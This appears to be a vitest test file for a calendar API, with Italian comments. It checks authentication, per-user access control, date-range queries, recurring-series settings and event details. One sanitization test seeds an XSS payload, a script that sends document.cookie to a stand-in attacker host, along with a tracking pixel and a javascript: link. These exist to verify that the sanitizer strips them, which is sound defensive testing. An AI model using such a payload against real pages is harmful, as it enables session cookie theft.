import { randomUUID } from "node:crypto";
import {
  calendarEvents,
  calendarSeries,
  calendarSeriesRecurrence,
  googleAccounts,
  googleWorkspaces,
  projects,
  users,
  type Db,
} from "@stubwise/db";
import type { TestDb } from "@stubwise/db/testing";
import { eq } from "drizzle-orm";
import { startTestDb } from "@stubwise/db/testing";
import type { FastifyInstance } from "fastify";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import { buildApp } from "../app.js";
import { addMember, seedUsers } from "../test/fixtures.js";

/**
 * SEZIONE CALENDARIO (fase 7b): `GET /api/me/calendar` (appuntamenti visti),
 * `GET /api/me/calendar/series` (serie riconosciute), `PUT`/`DELETE
 * /api/me/calendar/series/:recurringEventId` (attiva/spegne).
 *
 * Filo conduttore, identico a `me-mail.test.ts`: **`user_id` è nel WHERE di
 * ogni rotta**, verificato guardando che l'admin — NON solo un membro
 * qualunque — non veda né tocchi il calendario del member.
 */

const SESSION_SECRET = "segreto-di-test-lungo-almeno-32-caratteri!!";

let testDb: TestDb;
let db: Db;
let app: FastifyInstance;
let adminCookie: string;
let memberCookie: string;
let memberId: string;

beforeAll(async () => {
  testDb = await startTestDb();
  db = testDb.db;
  app = buildApp({ db, sessionSecret: SESSION_SECRET, encryptionKey: Buffer.alloc(32, 7).toString("base64") });
  ({ adminCookie, memberCookie, memberId } = await seedUsers(app));
}, 120_000);

afterEach(async () => {
  await db.delete(calendarSeries);
  await db.delete(calendarEvents);
  await db.delete(googleAccounts);
  await db.delete(googleWorkspaces);
});

afterAll(async () => {
  await app.close();
  await testDb.stop();
});

async function seedAccount(userId: string): Promise<{ accountId: string; email: string }> {
  const [workspace] = await db
    .insert(googleWorkspaces)
    .values({ name: "Acme", domains: ["acme.test"], clientId: "client-id", clientSecretEncrypted: "blob" })
    .returning({ id: googleWorkspaces.id });
  const email = `mailbox-${randomUUID()}@acme.test`;
  const [account] = await db
    .insert(googleAccounts)
    .values({
      userId,
      workspaceId: workspace!.id,
      email,
      googleSub: `sub-${randomUUID()}`,
      refreshTokenEncrypted: "blob",
    })
    .returning({ id: googleAccounts.id });
  return { accountId: account!.id, email };
}

async function seedProject(name = "Progetto di test"): Promise<string> {
  const [row] = await db
    .insert(projects)
    .values({ name, slug: `slug-${randomUUID()}`, ingestionKey: randomUUID() })
    .returning({ id: projects.id });
  return row!.id;
}

async function seedCalendarEvent(
  accountId: string,
  overrides: Partial<typeof calendarEvents.$inferInsert> = {},
): Promise<string> {
  const startsAt = overrides.startsAt ?? new Date("2026-09-20T10:00:00.000Z");
  const [row] = await db
    .insert(calendarEvents)
    .values({
      accountId,
      googleEventId: `e-${randomUUID()}`,
      title: "Demo col cliente",
      startsAt,
      status: "confirmed",
      fingerprint: `${(startsAt as Date).toISOString().slice(0, 10)} demo col cliente`,
      ...overrides,
    })
    .returning({ id: calendarEvents.id });
  return row!.id;
}

function getCalendar(cookie: string, query = "") {
  return app.inject({ method: "GET", url: `/api/me/calendar${query}`, headers: { cookie } });
}

function getSeries(cookie: string, query = "") {
  return app.inject({ method: "GET", url: `/api/me/calendar/series${query}`, headers: { cookie } });
}

function putSeries(cookie: string, recurringEventId: string, body: Record<string, unknown>) {
  return app.inject({
    method: "PUT",
    url: `/api/me/calendar/series/${encodeURIComponent(recurringEventId)}`,
    headers: { cookie },
    payload: body,
  });
}

function deleteSeries(cookie: string, recurringEventId: string, account: string) {
  return app.inject({
    method: "DELETE",
    url: `/api/me/calendar/series/${encodeURIComponent(recurringEventId)}?account=${account}`,
    headers: { cookie },
  });
}

describe("GET /api/me/calendar", () => {
  it("senza sessione: 401", async () => {
    expect((await getCalendar("")).statusCode).toBe(401);
  });

  it("elenca gli appuntamenti dell'utente, ordinati per data desc", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, { title: "Primo", startsAt: new Date("2026-09-15T09:00:00.000Z") });
    await seedCalendarEvent(accountId, { title: "Secondo", startsAt: new Date("2026-09-20T09:00:00.000Z") });

    const res = await getCalendar(memberCookie);
    expect(res.statusCode).toBe(200);
    const body = res.json();
    expect(body.items.map((item: { title: string }) => item.title)).toEqual(["Secondo", "Primo"]);
  });

  it("ACL: un admin non vede il calendario di un member (pagina vuota, non 403)", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId);

    const res = await getCalendar(adminCookie);
    expect(res.statusCode).toBe(200);
    expect(res.json().items).toEqual([]);
  });

  it("porta recurringEventId quando l'occorrenza appartiene a una serie", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, { recurringEventId: "serie-1" });
    const res = await getCalendar(memberCookie);
    expect(res.json().items[0].recurringEventId).toBe("serie-1");
  });
});

describe("GET /api/me/calendar/range (fase 9, Task 3)", () => {
  function getRange(cookie: string, from: string, to: string, extra = "") {
    return app.inject({
      method: "GET",
      url: `/api/me/calendar/range?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}${extra}`,
      headers: { cookie },
    });
  }

  it("senza sessione: 401", async () => {
    expect((await getRange("", "2026-09-01T00:00:00.000Z", "2026-09-08T00:00:00.000Z")).statusCode).toBe(401);
  });

  it("un evento DENTRO l'intervallo compare, uno FUORI no", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, { title: "Dentro", startsAt: new Date("2026-09-15T09:00:00.000Z") });
    await seedCalendarEvent(accountId, { title: "Fuori", startsAt: new Date("2026-10-15T09:00:00.000Z") });

    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
    expect(res.statusCode).toBe(200);
    const titles = res.json().items.map((item: { title: string }) => item.title);
    expect(titles).toEqual(["Dentro"]);
  });

  it("un evento che INIZIA prima dell'intervallo ma finisce dentro compare (sovrapposizione, non solo startsAt)", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, {
      title: "A cavallo",
      startsAt: new Date("2026-08-31T23:00:00.000Z"),
      endsAt: new Date("2026-09-01T01:00:00.000Z"),
    });

    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
    expect(res.json().items.map((item: { title: string }) => item.title)).toEqual(["A cavallo"]);
  });

  it("porta attendees/endsAt/allDay/eventUrl", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, {
      title: "Con dettagli",
      startsAt: new Date("2026-09-15T09:00:00.000Z"),
      endsAt: new Date("2026-09-15T10:00:00.000Z"),
      allDay: false,
      attendees: [{ email: "cliente@acme.test", responseStatus: "accepted" }],
      htmlLink: "https://calendar.google.test/e1",
    });

    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
    const [item] = res.json().items;
    expect(item.attendees).toEqual([{ email: "cliente@acme.test", responseStatus: "accepted" }]);
    expect(item.endsAt).toBe("2026-09-15T10:00:00.000Z");
    expect(item.allDay).toBe(false);
    expect(item.eventUrl).toBe("https://calendar.google.test/e1");
  });

  it("ACL: un admin non vede gli eventi di un member", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, { startsAt: new Date("2026-09-15T09:00:00.000Z") });

    const res = await getRange(adminCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
    expect(res.statusCode).toBe(200);
    expect(res.json().items).toEqual([]);
  });

  // -------------------------------------------------------------------------
  // 15 set 2026 (§2): i campi nuovi, e la descrizione come HTML NON FIDATO.
  // -------------------------------------------------------------------------

  it("⚠️ la descrizione esce SANIFICATA e la colonna la contiene ancora GREZZA", async () => {
    const { accountId } = await seedAccount(memberId);
    const hostile =
      '<p>Ordine del giorno</p><script>fetch("https://evil.test/"+document.cookie)</script>' +
      '<img src="https://tracker.test/pixel.gif"><a href="javascript:alert(1)">clicca</a>';
    const id = await seedCalendarEvent(accountId, {
      title: "Con descrizione ostile",
      startsAt: new Date("2026-09-15T09:00:00.000Z"),
      description: hostile,
    });

    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
    const [item] = res.json().items;

    // Fuori: niente script, niente `src` remoto (spostato in `data-src`,
    // così la richiesta non parte finché chi legge non la chiede), niente
    // `javascript:` negli href.
    expect(item.descriptionHtml).not.toContain("<script");
    expect(item.descriptionHtml).not.toContain("evil.test");
    // `\ssrc="` e non la sottostringa nuda: `data-src="…"` la conterrebbe,
    // e il test passerebbe per il motivo sbagliato — è l'attributo `src`
    // VERO che non deve esistere, perché è quello che fa partire la
    // richiesta al pixel di tracciamento.
    expect(/\ssrc="/.test(item.descriptionHtml)).toBe(false);
    expect(item.descriptionHtml).toContain('data-src="https://tracker.test/pixel.gif"');
    expect(item.descriptionHtml).not.toContain("javascript:");
    expect(item.descriptionHtml).toContain("Ordine del giorno");

    // Dentro: ANCORA GREZZA. È il punto dell'invariante — col grezzo in
    // colonna una correzione al filtro vale retroattivamente, senza
    // migrazioni di dati. La lettura non riscrive la riga.
    const [row] = await db.select().from(calendarEvents).where(eq(calendarEvents.id, id));
    expect(row!.description).toBe(hostile);
  });

  it("la descrizione arriva anche come TESTO, per chi non rende HTML (l'app)", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, {
      title: "Con descrizione",
      startsAt: new Date("2026-09-15T09:00:00.000Z"),
      description: "<p>Primo punto</p><p>Secondo punto</p>",
    });

    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
    const [item] = res.json().items;
    expect(item.descriptionText).toContain("Primo punto");
    expect(item.descriptionText).toContain("Secondo punto");
    expect(item.descriptionText).not.toContain("<p>");
  });

  it("un evento SPOGLIO non produce stringhe vuote dove il senso è «non c'era»", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, {
      title: "Spoglio",
      startsAt: new Date("2026-09-15T09:00:00.000Z"),
    });

    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
    const [item] = res.json().items;
    // `null`, non `""`: la UI distingue «non c'era» da «c'era ed era vuoto»
    // e non disegna un blocco «Dove» senza niente dentro.
    expect(item.descriptionHtml).toBeNull();
    expect(item.descriptionText).toBeNull();
    expect(item.location).toBeNull();
    expect(item.hangoutLink).toBeNull();
    expect(item.conferenceEntryPoints).toEqual([]);
    expect(item.reminders).toEqual([]);
    expect(item.remindersUseDefault).toBe(false);
    expect(item.recurrence).toEqual([]);
  });

  it("una descrizione fatta di soli spazi vale «non c'era», non una cornice vuota", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, {
      title: "Quasi spoglio",
      startsAt: new Date("2026-09-15T09:00:00.000Z"),
      description: "   \n  ",
    });

    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
    expect(res.json().items[0].descriptionHtml).toBeNull();
  });

  it("luogo, link per partecipare e promemoria arrivano com'erano", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, {
      title: "Con tutto",
      startsAt: new Date("2026-09-15T09:00:00.000Z"),
      location: "Sala Grande, via Roma 1",
      hangoutLink: "https://meet.google.com/abc-defg-hij",
      conferenceEntryPoints: [
        { type: "phone", uri: "tel:+39061234567", label: "+39 06 1234567", pin: "998877" },
      ],
      reminders: [{ method: "popup", minutes: 10 }],
      remindersUseDefault: true,
    });

    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
    const [item] = res.json().items;
    expect(item.location).toBe("Sala Grande, via Roma 1");
    expect(item.hangoutLink).toBe("https://meet.google.com/abc-defg-hij");
    expect(item.conferenceEntryPoints).toEqual([
      { type: "phone", uri: "tel:+39061234567", label: "+39 06 1234567", pin: "998877" },
    ]);
    expect(item.reminders).toEqual([{ method: "popup", minutes: 10 }]);
    expect(item.remindersUseDefault).toBe(true);
  });

  it("la ricorrenza viene dalla SERIE, ed è la stessa su ogni occorrenza (Task 7)", async () => {
    const { accountId } = await seedAccount(memberId);
    await db.insert(calendarSeriesRecurrence).values({
      accountId,
      recurringEventId: "serie-1",
      recurrence: ["RRULE:FREQ=WEEKLY;BYDAY=MO"],
    });
    for (const day of [15, 22]) {
      await seedCalendarEvent(accountId, {
        title: "Riunione settimanale",
        startsAt: new Date(`2026-09-${day}T09:00:00.000Z`),
        recurringEventId: "serie-1",
      });
    }
    // Un evento singolo nello stesso intervallo: non deve ereditare niente.
    await seedCalendarEvent(accountId, {
      title: "Singolo",
      startsAt: new Date("2026-09-16T09:00:00.000Z"),
    });

    const res = await getRange(memberCookie, "2026-09-01T00:00:00.000Z", "2026-09-30T00:00:00.000Z");
    const items: { title: string; recurrence: string[] }[] = res.json().items;
    const occurrences = items.filter((item) => item.title === "Riunione settimanale");
    expect(occurrences).toHaveLength(2);
    for (const occurrence of occurrences) {
      expect(occurrence.recurrence).toEqual(["RRULE:FREQ=WEEKLY;BYDAY=MO"]);
    }
    expect(items.find((item) => item.title === "Singolo")!.recurrence).toEqual([]);
  });

  it("'to' <= 'from': 400 invalid_range", async () => {
    const res = await getRange(memberCookie, "2026-09-10T00:00:00.000Z", "2026-09-01T00:00:00.000Z");
    expect(res.statusCode).toBe(400);
    expect(res.json().code).toBe("invalid_range");
  });

  it("intervallo più largo del tetto: 400 range_too_wide (non legge tutta la tabella)", async () => {
    const res = await getRange(memberCookie, "2021-01-01T00:00:00.000Z", "2035-01-01T00:00:00.000Z");
    expect(res.statusCode).toBe(400);
    expect(res.json().code).toBe("range_too_wide");
  });
});

describe("GET /api/me/calendar/series", () => {
  it("senza sessione: 401", async () => {
    expect((await getSeries("")).statusCode).toBe(401);
  });

  it("raggruppa le occorrenze per serie e mostra i default quando non configurata (spenta)", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, {
      recurringEventId: "serie-1",
      title: "Pianificazione task",
      startsAt: new Date("2026-09-10T09:00:00.000Z"),
    });
    await seedCalendarEvent(accountId, {
      recurringEventId: "serie-1",
      title: "Pianificazione task",
      startsAt: new Date("2026-09-17T09:00:00.000Z"),
    });
    // Un evento singolo, senza serie: non deve comparire nell'elenco.
    await seedCalendarEvent(accountId, { title: "Singolo" });

    const res = await getSeries(memberCookie);
    expect(res.statusCode).toBe(200);
    const items = res.json().items;
    expect(items).toHaveLength(1);
    expect(items[0]).toMatchObject({
      recurringEventId: "serie-1",
      occurrenceCount: 2,
      enabled: false,
      projectId: null,
      action: "milestone",
      leadDays: 2,
      auto: false,
    });
  });

  it("le occorrenze passate producono una serie con nextOccurrenceAt null, ma restano visibili", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, {
      recurringEventId: "serie-passata",
      startsAt: new Date("2020-01-06T09:00:00.000Z"),
    });
    const res = await getSeries(memberCookie);
    const item = res.json().items.find((row: { recurringEventId: string }) => row.recurringEventId === "serie-passata");
    expect(item.nextOccurrenceAt).toBeNull();
    expect(item.enabled).toBe(false);
  });

  it("ACL: un admin non vede le serie di un member", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, { recurringEventId: "serie-1" });
    const res = await getSeries(adminCookie);
    expect(res.json().items).toEqual([]);
  });
});

describe("PUT /api/me/calendar/series/:recurringEventId", () => {
  it("senza sessione: 401", async () => {
    const res = await putSeries("", "serie-1", { accountId: randomUUID(), enabled: false, projectId: null });
    expect(res.statusCode).toBe(401);
  });

  it("400 se enabled:true senza projectId — il progetto si fissa, non si ri-deduce", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, { recurringEventId: "serie-1" });
    const res = await putSeries(memberCookie, "serie-1", { accountId, enabled: true, projectId: null });
    expect(res.statusCode).toBe(400);
  });

  it("404 se la serie non è mai stata vista (nessuna occorrenza sotto questo id)", async () => {
    const { accountId } = await seedAccount(memberId);
    const projectId = await seedProject();
    const res = await putSeries(memberCookie, "mai-vista", { accountId, enabled: true, projectId });
    expect(res.statusCode).toBe(404);
  });

  it("configura e accende la serie; GET /series riflette la configurazione", async () => {
    const { accountId } = await seedAccount(memberId);
    const projectId = await seedProject("Progetto Acme");
    await seedCalendarEvent(accountId, { recurringEventId: "serie-1" });

    const put = await putSeries(memberCookie, "serie-1", {
      accountId,
      enabled: true,
      projectId,
      action: "reminder",
      leadDays: 5,
      auto: false,
    });
    expect(put.statusCode).toBe(200);

    const res = await getSeries(memberCookie);
    const item = res.json().items[0];
    expect(item).toMatchObject({
      enabled: true,
      projectId,
      projectName: "Progetto Acme",
      action: "reminder",
      leadDays: 5,
      auto: false,
    });
  });

  it("una seconda PUT sostituisce la configurazione (upsert, non due righe)", async () => {
    const { accountId } = await seedAccount(memberId);
    const projectId = await seedProject();
    await seedCalendarEvent(accountId, { recurringEventId: "serie-1" });

    await putSeries(memberCookie, "serie-1", { accountId, enabled: true, projectId, leadDays: 2 });
    await putSeries(memberCookie, "serie-1", { accountId, enabled: true, projectId, leadDays: 7 });

    const res = await getSeries(memberCookie);
    expect(res.json().items).toHaveLength(1);
    expect(res.json().items[0].leadDays).toBe(7);
  });

  it("ACL: un admin non può configurare la serie di un member (404, la casella non è sua)", async () => {
    const { accountId } = await seedAccount(memberId);
    const projectId = await seedProject();
    await seedCalendarEvent(accountId, { recurringEventId: "serie-1" });

    const res = await putSeries(adminCookie, "serie-1", { accountId, enabled: true, projectId });
    expect(res.statusCode).toBe(404);
    // Non deve aver scritto nulla.
    const check = await getSeries(memberCookie);
    expect(check.json().items[0].enabled).toBe(false);
  });
});

describe("DELETE /api/me/calendar/series/:recurringEventId", () => {
  it("senza sessione: 401", async () => {
    expect((await deleteSeries("", "serie-1", randomUUID())).statusCode).toBe(401);
  });

  it("spegne la serie: la riga sparisce e la serie torna ai default", async () => {
    const { accountId } = await seedAccount(memberId);
    const projectId = await seedProject();
    await seedCalendarEvent(accountId, { recurringEventId: "serie-1" });
    await putSeries(memberCookie, "serie-1", { accountId, enabled: true, projectId });

    const del = await deleteSeries(memberCookie, "serie-1", accountId);
    expect(del.statusCode).toBe(200);

    const res = await getSeries(memberCookie);
    expect(res.json().items[0].enabled).toBe(false);
    expect(res.json().items[0].projectId).toBeNull();

    const rows = await db.select().from(calendarSeries);
    expect(rows).toHaveLength(0);
  });

  it("ACL: un admin non può spegnere la serie di un member (404, la casella non è sua)", async () => {
    const { accountId } = await seedAccount(memberId);
    const projectId = await seedProject();
    await seedCalendarEvent(accountId, { recurringEventId: "serie-1" });
    await putSeries(memberCookie, "serie-1", { accountId, enabled: true, projectId });

    const res = await deleteSeries(adminCookie, "serie-1", accountId);
    expect(res.statusCode).toBe(404);
    const rows = await db.select().from(calendarSeries);
    expect(rows).toHaveLength(1);
  });
});

describe("GET /api/me/calendar/events/:id (area 6, F1.4)", () => {
  function getEvent(cookie: string, id: string) {
    return app.inject({ method: "GET", url: `/api/me/calendar/events/${id}`, headers: { cookie } });
  }

  it("il proprio evento: la STESSA forma della riga di /range", async () => {
    const { accountId } = await seedAccount(memberId);
    const id = await seedCalendarEvent(accountId, {
      title: "Con dettagli",
      startsAt: new Date("2026-09-15T09:00:00.000Z"),
      endsAt: new Date("2026-09-15T10:00:00.000Z"),
      attendees: [{ email: "cliente@acme.test", responseStatus: "accepted" }],
      description: "<p>Ciao</p><script>x()</script>",
    });
    const res = await getEvent(memberCookie, id);
    expect(res.statusCode).toBe(200);
    const range = await app.inject({
      method: "GET",
      url: `/api/me/calendar/range?from=${encodeURIComponent("2026-09-01T00:00:00.000Z")}&to=${encodeURIComponent("2026-09-30T00:00:00.000Z")}`,
      headers: { cookie: memberCookie },
    });
    // La stessa forma, tranne ciò che SOLO il dettaglio aggiunge agli invitati (F4).
    const detail = res.json() as { attendees: Record<string, unknown>[] };
    const stripped = {
      ...detail,
      attendees: detail.attendees.map((a) => Object.fromEntries(Object.entries(a).filter(([k]) => k !== "personId" && k !== "organizer"))),
    };
    expect(stripped).toEqual(range.json().items[0]);
    expect(detail.attendees[0]).toMatchObject({ personId: null, organizer: false });
    expect(JSON.stringify(res.json())).not.toContain("<script>");
  });

  it("l'evento di un altro (anche per un admin) e uno che non esiste: lo STESSO 404", async () => {
    const { accountId } = await seedAccount(memberId);
    const id = await seedCalendarEvent(accountId);
    const foreign = await getEvent(adminCookie, id);
    const missing = await getEvent(adminCookie, randomUUID());
    expect(foreign.statusCode).toBe(404);
    expect(missing.statusCode).toBe(404);
    expect(foreign.json()).toEqual(missing.json());
    expect((foreign.json() as { code: string }).code).toBe("not_found");
  });

  it("un id non uuid: 400; senza sessione: 401", async () => {
    expect((await getEvent(memberCookie, "boh")).statusCode).toBe(400);
    expect((await getEvent("", randomUUID())).statusCode).toBe(401);
  });
});

describe("F3b, task 6: range leggero, i campi nuovi, le cancellate fuori", () => {
  const range = (cookie: string) =>
    app.inject({ method: "GET", url: `/api/me/calendar/range?from=${encodeURIComponent("2026-09-01T00:00:00.000Z")}&to=${encodeURIComponent("2026-09-30T00:00:00.000Z")}&fields=summary`, headers: { cookie } });

  it("ogni riga dice se è lavoro, chi ha deciso il progetto, tipo, trasparenza e la MIA risposta; i campi pesanti solo nel dettaglio", async () => {
    const { accountId, email } = await seedAccount(memberId);
    const projectId = await seedProject("Audin");
    // Membro: un progetto che chi guarda non vede esce null (review F4, punto 2).
    await addMember(app, projectId, memberId);
    const work = await seedCalendarEvent(accountId, {
      title: "Revisione",
      startsAt: new Date("2026-09-15T09:00:00.000Z"),
      projectId,
      projectBy: "rules",
      proposalCandidate: true,
      description: "<p>Ordine del giorno lungo</p>",
      attendees: [{ email, responseStatus: "tentative" }, { email: "cliente@x.it", responseStatus: "accepted" }],
    });
    await seedCalendarEvent(accountId, { title: "Ferie", startsAt: new Date("2026-09-16T00:00:00.000Z"), allDay: true, proposalCandidate: false, eventType: "outOfOffice", transparency: "transparent" });
    const items = (await range(memberCookie)).json().items as Record<string, unknown>[];
    expect(items.find((i) => i.title === "Revisione")).toMatchObject({ recognized: true, projectBy: "rules", myResponse: "tentative", descriptionHtml: null, attendees: [], attendeeCount: 2 });
    expect(items.find((i) => i.title === "Ferie")).toMatchObject({ recognized: false, projectBy: null, eventType: "outOfOffice", transparency: "transparent", reproposable: false });
    const detail = (await app.inject({ method: "GET", url: `/api/me/calendar/events/${work}`, headers: { cookie: memberCookie } })).json() as Record<string, unknown>;
    expect(detail).toMatchObject({ myResponse: "tentative", recognized: true });
    expect(detail.descriptionHtml).toContain("Ordine del giorno");
    expect((detail.attendees as unknown[]).length).toBe(2);
  });

  it("myResponse: null SOLO se la mia casella non è fra gli invitati; fra gli invitati senza risposta = needsAction (come il dettaglio)", async () => {
    const { accountId, email } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, { title: "Senza risposta", startsAt: new Date("2026-09-15T09:00:00.000Z"), attendees: [{ email, responseStatus: null }] });
    await seedCalendarEvent(accountId, { title: "Mio, senza invitati", startsAt: new Date("2026-09-15T10:00:00.000Z"), attendees: [] });
    const items = (await range(memberCookie)).json().items as { title: string; myResponse: string | null }[];
    expect(items.find((i) => i.title === "Senza risposta")!.myResponse).toBe("needsAction");
    expect(items.find((i) => i.title === "Mio, senza invitati")!.myResponse).toBeNull();
  });

  it("un evento cancellato su Google non compare nel calendario", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, { title: "Annullato", startsAt: new Date("2026-09-15T09:00:00.000Z"), status: "cancelled" });
    await seedCalendarEvent(accountId, { title: "Vivo", startsAt: new Date("2026-09-15T10:00:00.000Z") });
    expect(((await range(memberCookie)).json().items as { title: string }[]).map((i) => i.title)).toEqual(["Vivo"]);
  });

  it("una serie dice se è lavoro (almeno un'occorrenza riconosciuta)", async () => {
    const { accountId } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, { title: "Yoga", startsAt: new Date(Date.now() + 86_400_000), recurringEventId: "s-yoga", proposalCandidate: false });
    await seedCalendarEvent(accountId, { title: "SAL", startsAt: new Date(Date.now() + 86_400_000), recurringEventId: "s-sal", proposalCandidate: true });
    const items = (await getSeries(memberCookie)).json().items as { recurringEventId: string; recognized: boolean }[];
    expect(items.find((i) => i.recurringEventId === "s-yoga")!.recognized).toBe(false);
    expect(items.find((i) => i.recurringEventId === "s-sal")!.recognized).toBe(true);
  });
});

describe("F4, task 1: le letture per scrivere", () => {
  const range = (cookie: string) =>
    app.inject({ method: "GET", url: `/api/me/calendar/range?from=${encodeURIComponent("2026-09-01T00:00:00.000Z")}&to=${encodeURIComponent("2026-09-30T00:00:00.000Z")}&fields=summary`, headers: { cookie } });

  it("organizzatore: canEdit e non canRespond; invitato: il contrario, con la mia nota; mio senza invitati: canEdit; una riga di prima: etag null", async () => {
    const { accountId, email } = await seedAccount(memberId);
    await seedCalendarEvent(accountId, { title: "Organizzo io", startsAt: new Date("2026-09-15T09:00:00.000Z"), organizerSelf: true, organizer: email, etag: '"1"', attendees: [{ email, responseStatus: "accepted", self: true }, { email: "x@y.it", responseStatus: null }] });
    await seedCalendarEvent(accountId, { title: "Mi invitano", startsAt: new Date("2026-09-15T10:00:00.000Z"), organizer: "capo@y.it", etag: '"2"', attendees: [{ email: "capo@y.it", responseStatus: "accepted" }, { email, responseStatus: "tentative", comment: "forse tardi", self: true }] });
    await seedCalendarEvent(accountId, { title: "Mio da solo", startsAt: new Date("2026-09-15T11:00:00.000Z"), organizer: email, attendees: [] });
    await seedCalendarEvent(accountId, { title: "Di prima", startsAt: new Date("2026-09-15T12:00:00.000Z"), organizer: "capo@y.it", attendees: [{ email, responseStatus: "accepted" }] });
    const items = (await range(memberCookie)).json().items as Record<string, unknown>[];
    const by = (t: string) => items.find((i) => i.title === t)!;
    expect(by("Organizzo io")).toMatchObject({ canEdit: true, canRespond: false, etag: '"1"' });
    expect(by("Mi invitano")).toMatchObject({ canEdit: false, canRespond: true, myNote: "forse tardi", etag: '"2"' });
    expect(by("Mio da solo")).toMatchObject({ canEdit: true, canRespond: false });
    expect(by("Di prima")).toMatchObject({ canEdit: false, canRespond: true, etag: null, myNote: null });
  });

  it("nel dettaglio gli invitati hanno nome, la persona di Stubwise e chi organizza", async () => {
    const { accountId, email } = await seedAccount(memberId);
    const [colleague] = await db.select().from(users).where(eq(users.id, memberId));
    const id = await seedCalendarEvent(accountId, { title: "Con nomi", startsAt: new Date("2026-09-15T09:00:00.000Z"), organizer: "capo@y.it", attendees: [{ email: "capo@y.it", responseStatus: "accepted", name: "Il Capo" }, { email: colleague!.email.toUpperCase(), responseStatus: null }, { email, responseStatus: null, self: true }] });
    const detail = (await app.inject({ method: "GET", url: `/api/me/calendar/events/${id}`, headers: { cookie: memberCookie } })).json() as { attendees: { email: string; name?: string | null; personId?: string | null; organizer?: boolean }[] };
    expect(detail.attendees[0]).toMatchObject({ name: "Il Capo", organizer: true, personId: null });
    expect(detail.attendees[1]).toMatchObject({ personId: memberId, organizer: false });
  });
});
